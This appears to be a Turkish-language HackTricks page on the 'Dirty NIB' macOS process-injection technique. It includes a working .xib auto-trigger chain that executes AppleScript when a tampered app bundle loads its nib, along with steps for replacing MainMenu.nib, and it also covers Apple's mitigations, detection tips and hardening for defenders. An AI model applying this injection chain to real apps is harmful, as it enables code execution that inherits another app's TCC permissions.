# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB, imzalı bir macOS app bundle içindeki Interface Builder dosyalarının (.xib/.nib) kötüye kullanılarak hedef process içinde saldırgan kontrollü logic çalıştırılmasını ve böylece hedefin entitlements ile TCC permissions değerlerinin devralınmasını ifade eder. Bu teknik ilk olarak xpn (MDSec) tarafından belgelendirilmiş, daha sonra Apple’ın macOS 13 Ventura ve macOS 14 Sonoma sürümlerindeki mitigations konusunu da ele alan Sector7 tarafından genelleştirilip önemli ölçüde genişletilmiştir.<sup>[[1]](#references)[[2]](#references)</sup> Arka plan ve ayrıntılı incelemeler için sondaki references bölümüne bakın.

> TL;DR
> • macOS 13 Ventura öncesinde: bir bundle’ın MainMenu.nib dosyasını (veya startup sırasında yüklenen başka bir nib dosyasını) değiştirmek, process injection ve çoğu durumda privilege escalation elde etmek için güvenilir bir yöntemdi.
> • macOS 13 (Ventura) sonrasında ve macOS 14 (Sonoma) ile geliştirilen: ilk launch deep verification, bundle protection, Launch Constraints ve yeni TCC “App Management” permission, ilgisiz app'ler tarafından launch sonrasında yapılan nib tampering işlemlerini büyük ölçüde engeller. Saldırılar yine de niş durumlarda mümkün olabilir (ör. aynı developer’a ait tooling’in kendi app'lerini değiştirmesi veya kullanıcının App Management/Full Disk Access verdiği terminaller).

## NIB/XIB files nedir

Nib (NeXT Interface Builder’ın kısaltması) files, AppKit app'leri tarafından kullanılan serialize edilmiş UI object graph'larıdır. Modern Xcode, düzenlenebilir XML .xib files kullanır ve bunlar build sırasında .nib dosyasına compile edilir. Tipik bir app, `NSApplicationMain()` aracılığıyla ana UI'ını yükler; bu işlem app'in Info.plist dosyasındaki `NSMainNibFile` key'ini okur ve object graph'ı runtime sırasında instantiate eder.

Saldırıyı mümkün kılan önemli noktalar:
- NIB loading, sınıfların NSSecureCoding ile uyumlu olmasını gerektirmeden arbitrary Objective-C class'larını instantiate eder (Apple’ın nib loader'ı, `initWithCoder:` mevcut olmadığında `init`/`initWithFrame:` yöntemlerine fallback yapar).
- Cocoa Bindings, nib'ler instantiate edilirken method'ları çağırmak için kötüye kullanılabilir; buna user interaction gerektirmeyen chained call'lar da dahildir.


## Dirty NIB injection process (attacker view)

Klasik pre‑Ventura flow:
1) Malicious bir .xib oluşturun
- Bir `NSAppleScript` object'i (veya `NSTask` gibi diğer “gadget” class'larını) ekleyin.
- Payload'ı (ör. AppleScript veya command arguments) title içinde barındıran bir `NSTextField` ekleyin.
- Target object üzerindeki method'ları çağırmak için binding'lerle bağlanmış bir veya daha fazla `NSMenuItem` object'i ekleyin.

2) User click olmadan auto-trigger
- Bir menu item'ın target/selector'ünü ayarlamak için binding'leri kullanın ve ardından private `_corePerformAction` method'unu invoke edin; böylece action, nib load edildiğinde otomatik olarak çalışır. Bu, bir user'ın button'a tıklaması gereksinimini ortadan kaldırır.

Bir .xib içindeki auto-trigger chain için minimal example (açıklık amacıyla kısaltılmıştır):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Bu, nib load sırasında hedef process içinde arbitrary AppleScript execution gerçekleştirilmesini sağlar.<sup>[[1]](#references)</sup> Gelişmiş chain'ler şunları yapabilir:
- Arbitrary AppKit class'larını (ör. `NSTask`) instantiate edebilir ve `-launch` gibi zero-argument method'ları çağırabilir.
- Yukarıdaki binding trick aracılığıyla object argument'larıyla arbitrary selector'ları çağırabilir.
- AppleScriptObjC.framework'ü load ederek Objective-C'ye bridge kurabilir ve hatta seçili C API'lerini çağırabilir.
- Hâlâ Python.framework içeren eski sistemlerde Python'a bridge kurabilir ve ardından arbitrary C function'larını çağırmak için `ctypes` kullanabilir (Sector7 araştırması).<sup>[[2]](#references)</sup>

3) Uygulamanın nib dosyasını değiştir
- target.app'ı yazılabilir bir konuma kopyalayın, örneğin `Contents/Resources/MainMenu.nib` dosyasını malicious nib ile değiştirin ve target.app'ı çalıştırın. Ventura öncesinde, tek seferlik bir Gatekeeper assessment işleminden sonra sonraki launch'lar yalnızca shallow signature checks gerçekleştiriyordu; bu nedenle `.nib` gibi executable olmayan resource'lar yeniden validate edilmiyordu.

Görünür bir test için örnek AppleScript payload'ı:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS korumaları (Ventura/Monterey/Sonoma/Sequoia)

Apple, modern macOS sürümlerinde Dirty NIB'in uygulanabilirliğini önemli ölçüde azaltan çeşitli sistemik mitigations (azaltıcı önlemler) sunmuştur:<sup>[[2]](#references)</sup>
- İlk çalıştırmada derin doğrulama ve bundle koruması (macOS 13 Ventura)
- Herhangi bir uygulamanın ilk çalıştırılmasında (quarantine uygulanmış olsun veya olmasın), derin bir signature check tüm bundle kaynaklarını kapsar. Sonrasında bundle korunur: yalnızca aynı developer'a ait uygulamalar (veya uygulama tarafından açıkça izin verilenler) içeriğini değiştirebilir. Diğer uygulamaların başka bir uygulamanın bundle'ına yazabilmesi için yeni TCC “App Management” izni gerekir.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled uygulamalar başka bir konuma kopyalanıp çalıştırılamaz; bu, OS uygulamaları için “copy to /tmp, patch, run” yaklaşımını geçersiz kılar.
- macOS 14 Sonoma'daki iyileştirmeler
- Apple, App Management'ı güçlendirdi ve Sector7 tarafından belirtilen bilinen bypass'ları (ör. CVE-2023-40450) düzeltti. Python.framework daha önce (macOS 12.3) kaldırılmıştı ve bazı privilege-escalation zincirlerini bozdu.
- Gatekeeper/Quarantine değişiklikleri
- Bu tekniği etkileyen Gatekeeper, provenance ve assessment değişikliklerinin daha geniş bir değerlendirmesi için aşağıda referans verilen sayfaya bakın.

> Pratik çıkarım
> • Ventura+ sürümlerinde, process'inizde App Management izni yoksa veya hedefle aynı Team ID ile imzalanmamışsa (ör. developer tooling), genellikle üçüncü taraf bir uygulamanın .nib dosyasını değiştiremezsiniz.
> • Shell'lere/terminal'lere App Management veya Full Disk Access verilmesi, bu terminalin context'inde code execute edebilen her şey için bu attack surface'i fiilen yeniden açar.


### Launch Constraints'i ele alma

Launch Constraints, Ventura ile başlayan birçok Apple uygulamasının default olmayan konumlardan çalıştırılmasını engeller. Ventura öncesi workflow'lara (ör. bir Apple uygulamasını geçici bir dizine kopyalamak, `MainMenu.nib` dosyasını değiştirmek ve uygulamayı çalıştırmak) güveniyorsanız, bunun >= 13.0 sürümlerinde başarısız olmasını bekleyin.


## Hedefleri ve nib'leri listeleme (research / legacy systems için kullanışlı)

- UI'ı nib tabanlı olan uygulamaları bulun:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Bir bundle içindeki olası nib kaynaklarını bulun:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Kod imzalarını kapsamlı şekilde doğrulayın (kaynakları değiştirdiyseniz ve yeniden imzalamadıysanız başarısız olur):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Not: Modern macOS'ta, uygun yetkilendirme olmadan başka bir uygulamanın bundle'ına yazmaya çalıştığınızda bundle protection/TCC tarafından da engellenirsiniz.


## Detection ve DFIR ipuçları

- Bundle kaynaklarında dosya bütünlüğü izleme
- Yüklü uygulamalardaki `Contents/Resources/*.nib` ve diğer executable olmayan kaynakların mtime/ctime değişikliklerini izleyin.
- Unified logs ve process davranışı
- GUI uygulamaları içinde beklenmeyen AppleScript çalıştırılmasını ve AppleScriptObjC veya Python.framework yükleyen process'leri izleyin. Örnek:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktif değerlendirmeler
- Kaynakların bütünlüğünü koruduğundan emin olmak için kritik uygulamalarda periyodik olarak `codesign --verify --deep` çalıştırın.
- Privilege context
- TCC kapsamında “App Management” veya Full Disk Access yetkisine sahip olanların/şeylerin denetimini yapın (özellikle terminaller ve management agent'ları). Bunları genel amaçlı shell'lerden kaldırmak, Dirty NIB tarzı manipülasyonun kolayca yeniden etkinleştirilmesini önler.


## Defensive hardening (developers ve defenders)

- Programmatic UI kullanmayı veya nib'lerden instantiate edilen şeyleri sınırlandırmayı tercih edin. Güçlü class'ları (ör. `NSTask`) nib graph'larına dahil etmekten kaçının ve arbitrary object'lerde selector'ları dolaylı olarak çağıran binding'lerden kaçının.
- Library Validation özellikli hardened runtime'ı benimseyin (modern uygulamalarda zaten standarttır). Bu, tek başına nib injection'ı durdurmasa da kolay native code loading işlemlerini engeller ve saldırganları yalnızca scripting payload'larına yönlendirir.
- Genel amaçlı araçlarda geniş App Management permission'ları istemeyin veya bunlara bağlı kalmayın. MDM App Management gerektiriyorsa bu context'i user-driven shell'lerden ayırın.
- Uygulamanızın bundle bütünlüğünü düzenli olarak doğrulayın ve update mekanizmalarınızın bundle kaynaklarını self-heal etmesini sağlayın.


## HackTricks'te ilgili okumalar

Bu tekniği etkileyen Gatekeeper, quarantine ve provenance değişiklikleri hakkında daha fazla bilgi edinin:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referanslar

- [1] [xpn – DirtyNIB (Pages örneğini içeren original write-up)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
